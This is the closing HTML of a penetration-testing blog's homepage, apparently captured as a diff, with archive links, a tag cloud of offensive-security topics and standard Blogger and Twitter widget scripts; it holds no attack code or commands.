+<span class='zippy'>
+
+        &#9658;&#160;
+      
+</span>
+</a>
+<a class='post-count-link' href='https://www.labofapenetrationtester.com/2013/05/'>
+May
+</a>
+<span class='post-count' dir='ltr'>(2)</span>
+</li>
+</ul>
+<ul class='hierarchy'>
+<li class='archivedate collapsed'>
+<a class='toggle' href='javascript:void(0)'>
+<span class='zippy'>
+
+        &#9658;&#160;
+      
+</span>
+</a>
+<a class='post-count-link' href='https://www.labofapenetrationtester.com/2013/04/'>
+April
+</a>
+<span class='post-count' dir='ltr'>(1)</span>
+</li>
+</ul>
+<ul class='hierarchy'>
+<li class='archivedate collapsed'>
+<a class='toggle' href='javascript:void(0)'>
+<span class='zippy'>
+
+        &#9658;&#160;
+      
+</span>
+</a>
+<a class='post-count-link' href='https://www.labofapenetrationtester.com/2013/02/'>
+February
+</a>
+<span class='post-count' dir='ltr'>(1)</span>
+</li>
+</ul>
+<ul class='hierarchy'>
+<li class='archivedate collapsed'>
+<a class='toggle' href='javascript:void(0)'>
+<span class='zippy'>
+
+        &#9658;&#160;
+      
+</span>
+</a>
+<a class='post-count-link' href='https://www.labofapenetrationtester.com/2013/01/'>
+January
+</a>
+<span class='post-count' dir='ltr'>(2)</span>
+</li>
+</ul>
+</li>
+</ul>
+<ul class='hierarchy'>
+<li class='archivedate collapsed'>
+<a class='toggle' href='javascript:void(0)'>
+<span class='zippy'>
+
+        &#9658;&#160;
+      
+</span>
+</a>
+<a class='post-count-link' href='https://www.labofapenetrationtester.com/2012/'>
+2012
+</a>
+<span class='post-count' dir='ltr'>(14)</span>
+<ul class='hierarchy'>
+<li class='archivedate collapsed'>
+<a class='toggle' href='javascript:void(0)'>
+<span class='zippy'>
+
+        &#9658;&#160;
+      
+</span>
+</a>
+<a class='post-count-link' href='https://www.labofapenetrationtester.com/2012/12/'>
+December
+</a>
+<span class='post-count' dir='ltr'>(1)</span>
+</li>
+</ul>
+<ul class='hierarchy'>
+<li class='archivedate collapsed'>
+<a class='toggle' href='javascript:void(0)'>
+<span class='zippy'>
+
+        &#9658;&#160;
+      
+</span>
+</a>
+<a class='post-count-link' href='https://www.labofapenetrationtester.com/2012/11/'>
+November
+</a>
+<span class='post-count' dir='ltr'>(1)</span>
+</li>
+</ul>
+<ul class='hierarchy'>
+<li class='archivedate collapsed'>
+<a class='toggle' href='javascript:void(0)'>
+<span class='zippy'>
+
+        &#9658;&#160;
+      
+</span>
+</a>
+<a class='post-count-link' href='https://www.labofapenetrationtester.com/2012/10/'>
+October
+</a>
+<span class='post-count' dir='ltr'>(1)</span>
+</li>
+</ul>
+<ul class='hierarchy'>
+<li class='archivedate collapsed'>
+<a class='toggle' href='javascript:void(0)'>
+<span class='zippy'>
+
+        &#9658;&#160;
+      
+</span>
+</a>
+<a class='post-count-link' href='https://www.labofapenetrationtester.com/2012/09/'>
+September
+</a>
+<span class='post-count' dir='ltr'>(1)</span>
+</li>
+</ul>
+<ul class='hierarchy'>
+<li class='archivedate collapsed'>
+<a class='toggle' href='javascript:void(0)'>
+<span class='zippy'>
+
+        &#9658;&#160;
+      
+</span>
+</a>
+<a class='post-count-link' href='https://www.labofapenetrationtester.com/2012/08/'>
+August
+</a>
+<span class='post-count' dir='ltr'>(2)</span>
+</li>
+</ul>
+<ul class='hierarchy'>
+<li class='archivedate collapsed'>
+<a class='toggle' href='javascript:void(0)'>
+<span class='zippy'>
+
+        &#9658;&#160;
+      
+</span>
+</a>
+<a class='post-count-link' href='https://www.labofapenetrationtester.com/2012/07/'>
+July
+</a>
+<span class='post-count' dir='ltr'>(1)</span>
+</li>
+</ul>
+<ul class='hierarchy'>
+<li class='archivedate collapsed'>
+<a class='toggle' href='javascript:void(0)'>
+<span class='zippy'>
+
+        &#9658;&#160;
+      
+</span>
+</a>
+<a class='post-count-link' href='https://www.labofapenetrationtester.com/2012/05/'>
+May
+</a>
+<span class='post-count' dir='ltr'>(2)</span>
+</li>
+</ul>
+<ul class='hierarchy'>
+<li class='archivedate collapsed'>
+<a class='toggle' href='javascript:void(0)'>
+<span class='zippy'>
+
+        &#9658;&#160;
+      
+</span>
+</a>
+<a class='post-count-link' href='https://www.labofapenetrationtester.com/2012/04/'>
+April
+</a>
+<span class='post-count' dir='ltr'>(3)</span>
+</li>
+</ul>
+<ul class='hierarchy'>
+<li class='archivedate collapsed'>
+<a class='toggle' href='javascript:void(0)'>
+<span class='zippy'>
+
+        &#9658;&#160;
+      
+</span>
+</a>
+<a class='post-count-link' href='https://www.labofapenetrationtester.com/2012/02/'>
+February
+</a>
+<span class='post-count' dir='ltr'>(2)</span>
+</li>
+</ul>
+</li>
+</ul>
+<ul class='hierarchy'>
+<li class='archivedate collapsed'>
+<a class='toggle' href='javascript:void(0)'>
+<span class='zippy'>
+
+        &#9658;&#160;
+      
+</span>
+</a>
+<a class='post-count-link' href='https://www.labofapenetrationtester.com/2011/'>
+2011
+</a>
+<span class='post-count' dir='ltr'>(1)</span>
+<ul class='hierarchy'>
+<li class='archivedate collapsed'>
+<a class='toggle' href='javascript:void(0)'>
+<span class='zippy'>
+
+        &#9658;&#160;
+      
+</span>
+</a>
+<a class='post-count-link' href='https://www.labofapenetrationtester.com/2011/12/'>
+December
+</a>
+<span class='post-count' dir='ltr'>(1)</span>
+</li>
+</ul>
+</li>
+</ul>
+</div>
+</div>
+<div class='clear'></div>
+<span class='widget-item-control'>
+<span class='item-control blog-admin'>
+<a class='quickedit' href='//www.blogger.com/rearrange?blogID=8135211063584500909&widgetType=BlogArchive&widgetId=BlogArchive1&action=editWidget&sectionId=sidebar-right-1' onclick='return _WidgetManager._PopupConfig(document.getElementById("BlogArchive1"));' rel='nofollow' target='configBlogArchive1' title='Edit'>
+<img alt='' height='18' src='https://resources.blogblog.com/img/icon18_wrench_allbkg.png' width='18'/>
+</a>
+</span>
+</span>
+<div class='clear'></div>
+</div>
+</div><div class='widget Label' data-version='1' id='Label1'>
+<h2>Tag Cloud</h2>
+<div class='widget-content cloud-label-widget-content'>
+<span class='label-size label-size-5'>
+<a dir='ltr' href='https://www.labofapenetrationtester.com/search/label/Powershell'>Powershell</a>
+</span>
+<span class='label-size label-size-5'>
+<a dir='ltr' href='https://www.labofapenetrationtester.com/search/label/PowerShell%20for%20Pen%20Test'>PowerShell for Pen Test</a>
+</span>
+<span class='label-size label-size-5'>
+<a dir='ltr' href='https://www.labofapenetrationtester.com/search/label/Penetration%20Testing'>Penetration Testing</a>
+</span>
+<span class='label-size label-size-5'>
+<a dir='ltr' href='https://www.labofapenetrationtester.com/search/label/Nishang'>Nishang</a>
+</span>
+<span class='label-size label-size-4'>
+<a dir='ltr' href='https://www.labofapenetrationtester.com/search/label/PowerShell%20Core'>PowerShell Core</a>
+</span>
+<span class='label-size label-size-4'>
+<a dir='ltr' href='https://www.labofapenetrationtester.com/search/label/Kautilya'>Kautilya</a>
+</span>
+<span class='label-size label-size-4'>
+<a dir='ltr' href='https://www.labofapenetrationtester.com/search/label/Red%20Team'>Red Team</a>
+</span>
+<span class='label-size label-size-4'>
+<a dir='ltr' href='https://www.labofapenetrationtester.com/search/label/Human%20Interface%20Device'>Human Interface Device</a>
+</span>
+<span class='label-size label-size-4'>
+<a dir='ltr' href='https://www.labofapenetrationtester.com/search/label/USB%20HID'>USB HID</a>
+</span>
+<span class='label-size label-size-4'>
+<a dir='ltr' href='https://www.labofapenetrationtester.com/search/label/Active%20Directory'>Active Directory</a>
+</span>
+<span class='label-size label-size-4'>
+<a dir='ltr' href='https://www.labofapenetrationtester.com/search/label/Security'>Security</a>
+</span>
+<span class='label-size label-size-4'>
+<a dir='ltr' href='https://www.labofapenetrationtester.com/search/label/Offensive%20PowerShell'>Offensive PowerShell</a>
+</span>
+<span class='label-size label-size-4'>
+<a dir='ltr' href='https://www.labofapenetrationtester.com/search/label/Teensy'>Teensy</a>
+</span>
+<span class='label-size label-size-3'>
+<a dir='ltr' href='https://www.labofapenetrationtester.com/search/label/Active%20Directory%20Attacks%20for%20Red%20and%20Blue%20Teams'>Active Directory Attacks for Red and Blue Teams</a>
+</span>
+<span class='label-size label-size-3'>
+<a dir='ltr' href='https://www.labofapenetrationtester.com/search/label/Offensive%20PowerShell%20for%20Red%20and%20Blue%20Teams'>Offensive PowerShell for Red and Blue Teams</a>
+</span>
+<span class='label-size label-size-3'>
+<a dir='ltr' href='https://www.labofapenetrationtester.com/search/label/Kerberos'>Kerberos</a>
+</span>
+<span class='label-size label-size-3'>
+<a dir='ltr' href='https://www.labofapenetrationtester.com/search/label/Mimikatz'>Mimikatz</a>
+</span>
+<span class='label-size label-size-3'>
+<a dir='ltr' href='https://www.labofapenetrationtester.com/search/label/ATA'>ATA</a>
+</span>
+<span class='label-size label-size-3'>
+<a dir='ltr' href='https://www.labofapenetrationtester.com/search/label/Advanced%20Threat%20Analytics'>Advanced Threat Analytics</a>
+</span>
+<span class='label-size label-size-3'>
+<a dir='ltr' href='https://www.labofapenetrationtester.com/search/label/Powerpreter'>Powerpreter</a>
+</span>
+<span class='label-size label-size-3'>
+<a dir='ltr' href='https://www.labofapenetrationtester.com/search/label/Continuous%20Integration'>Continuous Integration</a>
+</span>
+<span class='label-size label-size-3'>
+<a dir='ltr' href='https://www.labofapenetrationtester.com/search/label/Continuous%20Intrusion'>Continuous Intrusion</a>
+</span>
+<span class='label-size label-size-2'>
+<a dir='ltr' href='https://www.labofapenetrationtester.com/search/label/BlackHat'>BlackHat</a>
+</span>
+<span class='label-size label-size-2'>
+<a dir='ltr' href='https://www.labofapenetrationtester.com/search/label/Jenkins'>Jenkins</a>
+</span>
+<span class='label-size label-size-2'>
+<a dir='ltr' href='https://www.labofapenetrationtester.com/search/label/PowerShell%20for%20Red%20Team'>PowerShell for Red Team</a>
+</span>
+<span class='label-size label-size-2'>
+<a dir='ltr' href='https://www.labofapenetrationtester.com/search/label/AMSI'>AMSI</a>
+</span>
+<span class='label-size label-size-2'>
+<a dir='ltr' href='https://www.labofapenetrationtester.com/search/label/Active%20Directory%20Deception'>Active Directory Deception</a>
+</span>
+<span class='label-size label-size-2'>
+<a dir='ltr' href='https://www.labofapenetrationtester.com/search/label/Antak'>Antak</a>
+</span>
+<span class='label-size label-size-2'>
+<a dir='ltr' href='https://www.labofapenetrationtester.com/search/label/Applocker'>Applocker</a>
+</span>
+<span class='label-size label-size-2'>
+<a dir='ltr' href='https://www.labofapenetrationtester.com/search/label/Client%20Side%20Attacks'>Client Side Attacks</a>
+</span>
+<span class='label-size label-size-2'>
+<a dir='ltr' href='https://www.labofapenetrationtester.com/search/label/DCShadow'>DCShadow</a>
+</span>
+<span class='label-size label-size-2'>
+<a dir='ltr' href='https://www.labofapenetrationtester.com/search/label/Gupt'>Gupt</a>
+</span>
+<span class='label-size label-size-2'>
+<a dir='ltr' href='https://www.labofapenetrationtester.com/search/label/pass%20the%20hash'>pass the hash</a>
+</span>
+<span class='label-size label-size-2'>
+<a dir='ltr' href='https://www.labofapenetrationtester.com/search/label/pass%20the%20hash%20with%20powershell'>pass the hash with powershell</a>
+</span>
+<span class='label-size label-size-1'>
+<a dir='ltr' href='https://www.labofapenetrationtester.com/search/label/Bypass%20UAC'>Bypass UAC</a>
+</span>
+<span class='label-size label-size-1'>
+<a dir='ltr' href='https://www.labofapenetrationtester.com/search/label/Cobalt%20Strike'>Cobalt Strike</a>
+</span>
+<span class='label-size label-size-1'>
+<a dir='ltr' href='https://www.labofapenetrationtester.com/search/label/CruiseControl'>CruiseControl</a>
+</span>
+<span class='label-size label-size-1'>
+<a dir='ltr' href='https://www.labofapenetrationtester.com/search/label/Deception'>Deception</a>
+</span>
+<span class='label-size label-size-1'>
+<a dir='ltr' href='https://www.labofapenetrationtester.com/search/label/Deploy-Deception'>Deploy-Deception</a>
+</span>
+<span class='label-size label-size-1'>
+<a dir='ltr' href='https://www.labofapenetrationtester.com/search/label/End%20Point%20Protector%204'>End Point Protector 4</a>
+</span>
+<span class='label-size label-size-1'>
+<a dir='ltr' href='https://www.labofapenetrationtester.com/search/label/Go'>Go</a>
+</span>
+<span class='label-size label-size-1'>
+<a dir='ltr' href='https://www.labofapenetrationtester.com/search/label/IQY'>IQY</a>
+</span>
+<span class='label-size label-size-1'>
+<a dir='ltr' href='https://www.labofapenetrationtester.com/search/label/MJPEG'>MJPEG</a>
+</span>
+<span class='label-size label-size-1'>
+<a dir='ltr' href='https://www.labofapenetrationtester.com/search/label/Mac%20OS%20X'>Mac OS X</a>
+</span>
+<span class='label-size label-size-1'>
+<a dir='ltr' href='https://www.labofapenetrationtester.com/search/label/POODLE'>POODLE</a>
+</span>
+<span class='label-size label-size-1'>
+<a dir='ltr' href='https://www.labofapenetrationtester.com/search/label/PWSA'>PWSA</a>
+</span>
+<span class='label-size label-size-1'>
+<a dir='ltr' href='https://www.labofapenetrationtester.com/search/label/Phishing'>Phishing</a>
+</span>
+<span class='label-size label-size-1'>
+<a dir='ltr' href='https://www.labofapenetrationtester.com/search/label/PowerShell%20Web%20Access'>PowerShell Web Access</a>
+</span>
+<span class='label-size label-size-1'>
+<a dir='ltr' href='https://www.labofapenetrationtester.com/search/label/PowerShellv6'>PowerShellv6</a>
+</span>
+<span class='label-size label-size-1'>
+<a dir='ltr' href='https://www.labofapenetrationtester.com/search/label/PowerUpSQL'>PowerUpSQL</a>
+</span>
+<span class='label-size label-size-1'>
+<a dir='ltr' href='https://www.labofapenetrationtester.com/search/label/Prasadhak'>Prasadhak</a>
+</span>
+<span class='label-size label-size-1'>
+<a dir='ltr' href='https://www.labofapenetrationtester.com/search/label/SQL%20Server'>SQL Server</a>
+</span>
+<span class='label-size label-size-1'>
+<a dir='ltr' href='https://www.labofapenetrationtester.com/search/label/TeamCity'>TeamCity</a>
+</span>
+<span class='label-size label-size-1'>
+<a dir='ltr' href='https://www.labofapenetrationtester.com/search/label/VM'>VM</a>
+</span>
+<span class='label-size label-size-1'>
+<a dir='ltr' href='https://www.labofapenetrationtester.com/search/label/Virtual%20Machine'>Virtual Machine</a>
+</span>
+<span class='label-size label-size-1'>
+<a dir='ltr' href='https://www.labofapenetrationtester.com/search/label/WMI'>WMI</a>
+</span>
+<span class='label-size label-size-1'>
+<a dir='ltr' href='https://www.labofapenetrationtester.com/search/label/regsvr32'>regsvr32</a>
+</span>
+<span class='label-size label-size-1'>
+<a dir='ltr' href='https://www.labofapenetrationtester.com/search/label/rundll32'>rundll32</a>
+</span>
+<span class='label-size label-size-1'>
+<a dir='ltr' href='https://www.labofapenetrationtester.com/search/label/virustotal%20api'>virustotal api</a>
+</span>
+<div class='clear'></div>
+<span class='widget-item-control'>
+<span class='item-control blog-admin'>
+<a class='quickedit' href='//www.blogger.com/rearrange?blogID=8135211063584500909&widgetType=Label&widgetId=Label1&action=editWidget&sectionId=sidebar-right-1' onclick='return _WidgetManager._PopupConfig(document.getElementById("Label1"));' rel='nofollow' target='configLabel1' title='Edit'>
+<img alt='' height='18' src='https://resources.blogblog.com/img/icon18_wrench_allbkg.png' width='18'/>
+</a>
+</span>
+</span>
+<div class='clear'></div>
+</div>
+</div><div class='widget HTML' data-version='1' id='HTML2'>
+<h2 class='title'>My Twitter Feed</h2>
+<div class='widget-content'>
+<a class="twitter-timeline"  href="https://twitter.com/nikhil_mitt"  data-widget-id="326546420716945408">Tweets by @nikhil_mitt</a>
+<script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0],p=/^http:/.test(d.location)?'http':'https';if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src=p+"://platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}}(document,"script","twitter-wjs");</script>
+</div>
+<div class='clear'></div>
+<span class='widget-item-control'>
+<span class='item-control blog-admin'>
+<a class='quickedit' href='//www.blogger.com/rearrange?blogID=8135211063584500909&widgetType=HTML&widgetId=HTML2&action=editWidget&sectionId=sidebar-right-1' onclick='return _WidgetManager._PopupConfig(document.getElementById("HTML2"));' rel='nofollow' target='configHTML2' title='Edit'>
+<img alt='' height='18' src='https://resources.blogblog.com/img/icon18_wrench_allbkg.png' width='18'/>
+</a>
+</span>
+</span>
+<div class='clear'></div>
+</div></div>
+<table border='0' cellpadding='0' cellspacing='0' class='section-columns columns-2'>
+<tbody>
+<tr>
+<td class='first columns-cell'>
+<div class='sidebar no-items section' id='sidebar-right-2-1'></div>
+</td>
+<td class='columns-cell'>
+<div class='sidebar no-items section' id='sidebar-right-2-2'></div>
+</td>
+</tr>
+</tbody>
+</table>
+<div class='sidebar no-items section' id='sidebar-right-3'></div>
+</aside>
+</div>
+</div>
+</div>
+<div style='clear: both'></div>
+<!-- columns -->
+</div>
+<!-- main -->
+</div>
+</div>
+<div class='main-cap-bottom cap-bottom'>
+<div class='cap-left'></div>
+<div class='cap-right'></div>
+</div>
+</div>
+<footer>
+<div class='footer-outer'>
+<div class='footer-cap-top cap-top'>
+<div class='cap-left'></div>
+<div class='cap-right'></div>
+</div>
+<div class='fauxborder-left footer-fauxborder-left'>
+<div class='fauxborder-right footer-fauxborder-right'></div>
+<div class='region-inner footer-inner'>
+<div class='foot no-items section' id='footer-1'></div>
+<table border='0' cellpadding='0' cellspacing='0' class='section-columns columns-2'>
+<tbody>
+<tr>
+<td class='first columns-cell'>
+<div class='foot no-items section' id='footer-2-1'></div>
+</td>
+<td class='columns-cell'>
+<div class='foot no-items section' id='footer-2-2'></div>
+</td>
+</tr>
+</tbody>
+</table>
+<!-- outside of the include in order to lock Attribution widget -->
+<div class='foot section' id='footer-3' name='Footer'><div class='widget Attribution' data-version='1' id='Attribution1'>
+<div class='widget-content' style='text-align: center;'>
+Awesome Inc. theme. Powered by <a href='https://www.blogger.com' target='_blank'>Blogger</a>.
+</div>
+<div class='clear'></div>
+<span class='widget-item-control'>
+<span class='item-control blog-admin'>
+<a class='quickedit' href='//www.blogger.com/rearrange?blogID=8135211063584500909&widgetType=Attribution&widgetId=Attribution1&action=editWidget&sectionId=footer-3' onclick='return _WidgetManager._PopupConfig(document.getElementById("Attribution1"));' rel='nofollow' target='configAttribution1' title='Edit'>
+<img alt='' height='18' src='https://resources.blogblog.com/img/icon18_wrench_allbkg.png' width='18'/>
+</a>
+</span>
+</span>
+<div class='clear'></div>
+</div></div>
+</div>
+</div>
+<div class='footer-cap-bottom cap-bottom'>
+<div class='cap-left'></div>
+<div class='cap-right'></div>
+</div>
+</div>
+</footer>
+<!-- content -->
+</div>
+</div>
+<div class='content-cap-bottom cap-bottom'>
+<div class='cap-left'></div>
+<div class='cap-right'></div>
+</div>
+</div>
+</div>
+<script type='text/javascript'>
+    window.setTimeout(function() {
+        document.body.className = document.body.className.replace('loading', '');
+      }, 10);
+  </script>
+<script src='https://apis.google.com/js/plusone.js' type='text/javascript'></script>
+
+<script type="text/javascript" src="https://www.blogger.com/static/v1/widgets/1854097286-widgets.js"></script>
+<script type='text/javascript'>
+window['__wavt'] = 'AOuZoY4Klfh97e22Rpb7SySHOuSdPTRPaw:1554398748012';_WidgetManager._Init('//www.blogger.com/rearrange?blogID\x3d8135211063584500909','//www.labofapenetrationtester.com/','8135211063584500909');
+_WidgetManager._SetDataContext([{'name': 'blog', 'data': {'blogId': '8135211063584500909', 'title': 'Lab of a Penetration Tester', 'url': 'https://www.labofapenetrationtester.com/', 'canonicalUrl': 'http://www.labofapenetrationtester.com/', 'homepageUrl': 'https://www.labofapenetrationtester.com/', 'searchUrl': 'https://www.labofapenetrationtester.com/search', 'canonicalHomepageUrl': 'http://www.labofapenetrationtester.com/', 'blogspotFaviconUrl': 'https://www.labofapenetrationtester.com/favicon.ico', 'bloggerUrl': 'https://www.blogger.com', 'hasCustomDomain': true, 'httpsEnabled': true, 'enabledCommentProfileImages': true, 'gPlusViewType': 'FILTERED_POSTMOD', 'adultContent': false, 'analyticsAccountNumber': '', 'encoding': 'UTF-8', 'locale': 'en', 'localeUnderscoreDelimited': 'en', 'languageDirection': 'ltr', 'isPrivate': false, 'isMobile': false, 'isMobileRequest': false, 'mobileClass': '', 'isPrivateBlog': false, 'feedLinks': '\x3clink rel\x3d\x22alternate\x22 type\x3d\x22application/atom+xml\x22 title\x3d\x22Lab of a Penetration Tester - Atom\x22 href\x3d\x22https://www.labofapenetrationtester.com/feeds/posts/default\x22 /\x3e\n\x3clink rel\x3d\x22alternate\x22 type\x3d\x22application/rss+xml\x22 title\x3d\x22Lab of a Penetration Tester - RSS\x22 href\x3d\x22https://www.labofapenetrationtester.com/feeds/posts/default?alt\x3drss\x22 /\x3e\n\x3clink rel\x3d\x22service.post\x22 type\x3d\x22application/atom+xml\x22 title\x3d\x22Lab of a Penetration Tester - Atom\x22 href\x3d\x22https://www.blogger.com/feeds/8135211063584500909/posts/default\x22 /\x3e\n', 'meTag': '\x3clink rel\x3d\x22me\x22 href\x3d\x22https://www.blogger.com/profile/02092541175521734123\x22 /\x3e\n', 'adsenseHostId': 'ca-host-pub-1556223355139109', 'adsenseHasAds': false, 'ieCssRetrofitLinks': '\x3c!--[if IE]\x3e\x3cscript type\x3d\x22text/javascript\x22 src\x3d\x22https://www.blogger.com/static/v1/jsbin/1953397912-ieretrofit.js\x22\x3e\x3c/script\x3e\n\x3c![endif]--\x3e', 'view': '', 'dynamicViewsCommentsSrc': '//www.blogblog.com/dynamicviews/4224c15c4e7c9321/js/comments.js', 'dynamicViewsScriptSrc': '//www.blogblog.com/dynamicviews/0653eeb7078c79fe', 'plusOneApiSrc': 'https://apis.google.com/js/plusone.js', 'disableGComments': true, 'sharing': {'platforms': [{'name': 'Get link', 'key': 'link', 'shareMessage': 'Get link', 'target': ''}, {'name': 'Facebook', 'key': 'facebook', 'shareMessage': 'Share to Facebook', 'target': 'facebook'}, {'name': 'BlogThis!', 'key': 'blogThis', 'shareMessage': 'BlogThis!', 'target': 'blog'}, {'name': 'Twitter', 'key': 'twitter', 'shareMessage': 'Share to Twitter', 'target': 'twitter'}, {'name': 'Pinterest', 'key': 'pinterest', 'shareMessage': 'Share to Pinterest', 'target': 'pinterest'}, {'name': 'Email', 'key': 'email', 'shareMessage': 'Email', 'target': 'email'}], 'disableGooglePlus': true, 'googlePlusShareButtonWidth': 300, 'googlePlusBootstrap': '\x3cscript type\x3d\x22text/javascript\x22\x3ewindow.___gcfg \x3d {\x27lang\x27: \x27en\x27};\x3c/script\x3e'}, 'hasCustomJumpLinkMessage': false, 'jumpLinkMessage': 'Read more', 'pageType': 'index', 'pageName': '', 'pageTitle': 'Lab of a Penetration Tester', 'metaDescription': 'Home of Nikhil SamratAshok Mittal. Posts about Red Teaming, Offensive PowerShell, Active Directory and Pen Testing.'}}, {'name': 'features', 'data': {'sharing_get_link_dialog': 'true', 'sharing_native': 'false'}}, {'name': 'messages', 'data': {'edit': 'Edit', 'linkCopiedToClipboard': 'Link copied to clipboard!', 'ok': 'Ok', 'postLink': 'Post Link'}}, {'name': 'template', 'data': {'name': 'custom', 'localizedName': 'Custom', 'isResponsive': false, 'isAlternateRendering': false, 'isCustom': true, 'variant': 'light', 'variantId': 'light'}}, {'name': 'view', 'data': {'classic': {'name': 'classic', 'url': '?view\x3dclassic'}, 'flipcard': {'name': 'flipcard', 'url': '?view\x3dflipcard'}, 'magazine': {'name': 'magazine', 'url': '?view\x3dmagazine'}, 'mosaic': {'name': 'mosaic', 'url': '?view\x3dmosaic'}, 'sidebar': {'name': 'sidebar', 'url': '?view\x3dsidebar'}, 'snapshot': {'name': 'snapshot', 'url': '?view\x3dsnapshot'}, 'timeslide': {'name': 'timeslide', 'url': '?view\x3dtimeslide'}, 'isMobile': false, 'title': 'Lab of a Penetration Tester', 'description': 'Home of Nikhil SamratAshok Mittal. Posts about Red Teaming, Offensive PowerShell, Active Directory and Pen Testing.', 'url': 'https://www.labofapenetrationtester.com/', 'type': 'feed', 'isSingleItem': false, 'isMultipleItems': true, 'isError': false, 'isPage': false, 'isPost': false, 'isHomepage': true, 'isArchive': false, 'isLabelSearch': false}}]);
+_WidgetManager._RegisterWidget('_NavbarView', new _WidgetInfo('Navbar1', 'navbar', document.getElementById('Navbar1'), {}, 'displayModeFull'));
+_WidgetManager._RegisterWidget('_HeaderView', new _WidgetInfo('Header1', 'header', document.getElementById('Header1'), {}, 'displayModeFull'));
+_WidgetManager._RegisterWidget('_PageListView', new _WidgetInfo('PageList1', 'crosscol', document.getElementById('PageList1'), {'title': 'Pages', 'links': [{'isCurrentPage': true, 'href': 'https://www.labofapenetrationtester.com/', 'title': 'Home'}, {'isCurrentPage': false, 'href': 'https://www.labofapenetrationtester.com/p/about-me.html', 'id': '5712326216638485656', 'title': 'About Me'}, {'isCurrentPage': false, 'href': 'https://www.labofapenetrationtester.com/p/blog-page.html', 'id': '8966313768456466890', 'title': 'Presentations'}, {'isCurrentPage': false, 'href': 'https://www.labofapenetrationtester.com/p/trainings.html', 'id': '3897680205449387591', 'title': 'Trainings'}], 'mobile': false}, 'displayModeFull'));
+_WidgetManager._RegisterWidget('_BlogView', new _WidgetInfo('Blog1', 'main', document.getElementById('Blog1'), {'cmtInteractionsEnabled': false, 'lightboxEnabled': true, 'lightboxModuleUrl': 'https://www.blogger.com/static/v1/jsbin/2848338547-lbx.js', 'lightboxCssUrl': 'https://www.blogger.com/static/v1/v-css/368954415-lightbox_bundle.css'}, 'displayModeFull'));
+_WidgetManager._RegisterWidget('_ProfileView', new _WidgetInfo('Profile1', 'sidebar-right-1', document.getElementById('Profile1'), {}, 'displayModeFull'));
+_WidgetManager._RegisterWidget('_LinkListView', new _WidgetInfo('LinkList1', 'sidebar-right-1', document.getElementById('LinkList1'), {}, 'displayModeFull'));
+_WidgetManager._RegisterWidget('_TextView', new _WidgetInfo('Text1', 'sidebar-right-1', document.getElementById('Text1'), {}, 'displayModeFull'));
+_WidgetManager._RegisterWidget('_TextView', new _WidgetInfo('Text3', 'sidebar-right-1', document.getElementById('Text3'), {}, 'displayModeFull'));
+_WidgetManager._RegisterWidget('_TextView', new _WidgetInfo('Text2', 'sidebar-right-1', document.getElementById('Text2'), {}, 'displayModeFull'));
+_WidgetManager._RegisterWidget('_BlogArchiveView', new _WidgetInfo('BlogArchive1', 'sidebar-right-1', document.getElementById('BlogArchive1'), {'languageDirection': 'ltr', 'loadingMessage': 'Loading\x26hellip;'}, 'displayModeFull'));
+_WidgetManager._RegisterWidget('_LabelView', new _WidgetInfo('Label1', 'sidebar-right-1', document.getElementById('Label1'), {}, 'displayModeFull'));
+_WidgetManager._RegisterWidget('_HTMLView', new _WidgetInfo('HTML2', 'sidebar-right-1', document.getElementById('HTML2'), {}, 'displayModeFull'));
+_WidgetManager._RegisterWidget('_AttributionView', new _WidgetInfo('Attribution1', 'footer-3', document.getElementById('Attribution1'), {}, 'displayModeFull'));
+</script>
+</body>
+</html>
+
+
+#####EOF#####
+
+
